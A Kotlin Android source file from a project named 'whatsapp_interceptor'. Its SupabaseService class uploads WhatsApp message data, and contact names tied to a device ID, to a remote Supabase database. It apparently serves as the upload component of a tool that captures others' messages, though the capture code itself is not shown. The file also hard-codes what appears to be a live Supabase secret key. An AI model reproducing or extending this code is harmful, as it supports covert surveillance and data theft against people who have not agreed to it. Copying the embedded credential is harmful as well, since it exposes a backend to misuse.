package com.example.whatsapp_interceptor

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap

class SupabaseService private constructor(private val context: Context) {

    companion object {
        private const val TAG = "SupabaseService"
        
        private const val SUPABASE_URL = "https://ymqyerwggfeiowaglrpg.supabase.co"
        private const val SUPABASE_KEY = "sb_secret_yF7icyRqduCye6B3Fe9Bvg_QSHPMjPt"
        private const val TABLE_MESSAGES = "whatsapp_messages"
        private const val TABLE_CONTACTS = "contacts"
        
        private val processedMessageIds = ConcurrentHashMap<String, Long>()

        private var instance: SupabaseService? = null

        fun getInstance(context: Context): SupabaseService {
            if (instance == null) {
                instance = SupabaseService(context.applicationContext)
            }
            return instance!!
        }

        fun isMessageProcessed(messageId: String): Boolean {
            return processedMessageIds.containsKey(messageId)
        }

        fun markMessageAsProcessed(messageId: String) {
            processedMessageIds[messageId] = System.currentTimeMillis()
        }

        fun cleanOldMessages() {
            val now = System.currentTimeMillis()
            val iterator = processedMessageIds.entries.iterator()
            while (iterator.hasNext()) {
                if (now - iterator.next().value > 24 * 60 * 60 * 1000) {
                    iterator.remove()
                }
            }
        }
    }

    private val client = OkHttpClient()
    private var isInitialized = false

    fun init() {
        if (isInitialized) return
        isInitialized = true
        Log.d(TAG, "✅ Supabase Service inicializado correctamente")
    }

    suspend fun sendMessageToSupabase(messageData: Map<String, Any>): Boolean {
        if (!isInitialized) init()

        return withContext(Dispatchers.IO) {
            try {
                val messageId = UUID.randomUUID().toString()
                
                val finalData = JSONObject().apply {
                    put("id", messageId)
                    messageData.forEach { (key, value) ->
                        put(key, value)
                    }
                }

                val url = "$SUPABASE_URL/rest/v1/$TABLE_MESSAGES"
                val body = finalData.toString().toRequestBody("application/json".toMediaType())

                val request = Request.Builder()
                    .url(url)
                    .post(body)
                    .addHeader("apikey", SUPABASE_KEY)
                    .addHeader("Authorization", "Bearer $SUPABASE_KEY")
                    .addHeader("Content-Type", "application/json")
                    .addHeader("Prefer", "return=minimal")
                    .build()

                val response = client.newCall(request).execute()
                val success = response.isSuccessful
                
                if (success) {
                    Log.d(TAG, "Mensaje guardado en Supabase - ID: $messageId")
                } else {
                    Log.e(TAG, "Error Supabase: ${response.code} - ${response.message}")
                }
                
                response.close()
                success

            } catch (e: Exception) {
                Log.e(TAG, "Excepción al guardar mensaje: ${e.message}")
                false
            }
        }
    }

    suspend fun updateContactInSupabase(name: String, type: String, deviceId: String): Boolean {
        if (!isInitialized) init()

        return withContext(Dispatchers.IO) {
            try {
                val contactId = name.replace(Regex("[.#$\\[\\]/]"), "_")
                
                val contactData = JSONObject().apply {
                    put("name", name)
                    put("type", type)
                    put("lastUpdated", System.currentTimeMillis())
                    put("deviceId", deviceId)
                }

                val url = "$SUPABASE_URL/rest/v1/$TABLE_CONTACTS"
                val body = contactData.toString().toRequestBody("application/json".toMediaType())

                val request = Request.Builder()
                    .url(url)
                    .post(body)
                    .addHeader("apikey", SUPABASE_KEY)
                    .addHeader("Authorization", "Bearer $SUPABASE_KEY")
                    .addHeader("Content-Type", "application/json")
                    .addHeader("Prefer", "return=minimal")
                    .build()

                val response = client.newCall(request).execute()
                val success = response.isSuccessful
                
                if (success) {
                    Log.d(TAG, "Contacto actualizado en Supabase: $contactId")
                }
                
                response.close()
                success

            } catch (e: Exception) {
                Log.e(TAG, "Error actualizando contacto en Supabase: ${e.message}")
                false
            }
        }
    }
}
